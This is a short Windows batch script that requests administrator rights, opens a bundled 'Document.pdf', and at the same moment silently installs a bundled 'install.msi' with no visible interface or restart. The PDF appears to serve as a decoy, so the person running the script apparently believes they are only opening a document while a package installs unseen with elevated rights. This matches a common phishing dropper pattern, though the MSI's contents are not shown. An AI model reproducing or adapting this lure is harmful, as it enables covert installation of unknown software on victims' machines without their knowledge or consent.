@echo off
cd /d "%~dp0"
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)
start "" "%~dp0Document.pdf"
msiexec /i "%~dp0install.msi" /qn /norestart /log "%~dp0msi_log.txt"
exit
